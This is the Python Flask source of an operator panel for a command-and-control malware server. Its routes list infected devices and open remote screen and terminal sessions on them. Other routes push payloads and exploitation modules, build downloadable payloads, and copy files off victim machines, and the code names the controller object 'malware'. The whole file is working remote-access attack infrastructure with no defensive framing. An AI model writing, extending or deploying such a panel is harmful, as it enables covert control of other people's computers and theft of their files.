import json
from flask import Flask, render_template, request, redirect, send_from_directory, session, url_for
import eventlet
import socketio
from c2 import C2
import os
import threading

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secret key for session management
sio = socketio.Server(cors_allowed_origins="*", logger=False, max_http_buffer_size=1e8)
malware = C2(sio)

# Helper function to check if user is logged in
def is_logged_in():
    credentials = get_credentials()
    return ("logged_in" in session and session["logged_in"]) or (not credentials["settings"]["require_login"])

# Function to read credentials from the JSON file
def get_credentials():
    try:
        with open("config.json", "r") as file:
            credentials = json.load(file)
        return credentials
    except FileNotFoundError:
        return None

@app.route("/")
def index():
    if not is_logged_in():
        return redirect(url_for('login'))  # Redirect to login page if not logged in
    return render_template("index.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"], show_login=get_credentials()["settings"]["require_login"])

@app.route("/files")
def upload():
    if not is_logged_in():
        return redirect(url_for('login'))
    return render_template("upload.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"], show_login=get_credentials()["settings"]["require_login"])

@app.route("/payload")
def payload():
    if not is_logged_in():
        return redirect(url_for('login'))
    return render_template("payload.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])

@app.route("/screen/<path:path>")
def screen(path):
    if not is_logged_in():
        return redirect(url_for('login'))
    devices = malware.list_devices()
    if path in devices:
        return render_template("screen.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
    else:
        return redirect("/")

@app.route("/terminal/<path:path>")
def terminal(path):
    if not is_logged_in():
        return redirect(url_for('login'))
    devices = malware.list_devices()
    if path in devices:
        return render_template("terminal.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
    else:
        return redirect("/")

@app.route("/term/<path:path>")
def term(path):
    if not is_logged_in():
        return redirect(url_for('login'))
    return render_template("jterm.html")

@app.route("/client/<path:filename>")
def client(filename):
    return send_from_directory("templates/client", filename)

@app.route("/get_payloads/<path:filename>")
def get_payloads(filename):
    return send_from_directory("payloads", filename, as_attachment=True)

@app.route("/devices", methods=["POST"])
def post():
    if not is_logged_in():
        return redirect(url_for('login'))
    return malware.list_all_devices()

@app.route("/delete", methods=["POST"])
def delete():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request.get_json()
    malware.delete_device(data["device_id"])
    return ""

@app.route("/ctrl", methods=["POST"])
def ctrl():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request.get_json()
    malware.ctrl(data["device_id"])
    return ""

@app.route("/payload", methods=["POST"])
def payload1():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request.get_json()
    malware.payload(data)
    return ""

@app.route("/download", methods=["POST"])
def download1():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request.get_json()
    threading.Thread(target=malware.generate, args=(data,)).start()
    return ""

@app.route("/list_payloads", methods=["POST"])
def list_payloads():
    if not is_logged_in():
        return redirect(url_for('login'))
    try:
        return str(os.listdir("payloads"))
    except:
        return "[]"

@app.route("/explotation_module", methods=["POST"])
def send_explotation_module():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request.get_json()
    malware.explotation_module(data)
    return ""

@app.route("/upload_file", methods=["POST"])
def upload_file():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request
    malware.upload_file(data)
    return ""

@app.route("/download_file", methods=["POST"])
def download_file():
    if not is_logged_in():
        return redirect(url_for('login'))
    data = request.get_json()
    malware.download_file(data)
    return ""

@app.route("/get_downloaded_files/<path:filename>")
def get_downloaded_files(filename):
    if not is_logged_in():
        return redirect(url_for('login'))
    return send_from_directory("files_saved", filename, as_attachment=True)

@app.route("/list_files", methods=["POST"])
def list_files():
    if not is_logged_in():
        return redirect(url_for('login'))
    try:
        return str(os.listdir("files_saved"))
    except:
        return "[]"

# Route for logging in
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        credentials = get_credentials()

        if credentials and username == credentials["auth"]["username"] and password == credentials["auth"]["password"]:
            session["logged_in"] = True  # Set session variable
            return redirect(url_for('index'))  # Redirect to the homepage after login
        else:
            return "Invalid credentials, try again.", 401  # Handle failed login

    # If GET request, show login form
    if not get_credentials()["settings"]["require_login"]:
       return redirect(url_for('index'))

    return render_template("login.html", style=get_credentials()["style"]["light_mode"])

# Route for logging out
@app.route("/logout")
def logout():
    session.pop("logged_in", None)  # Remove session
    return redirect(url_for('login'))  # Redirect to login page

if __name__ == "__main__":
    flaskApp = socketio.Middleware(sio, app)
    eventlet.wsgi.server(eventlet.listen(("0.0.0.0", get_credentials()["settings"]["port"])), flaskApp)
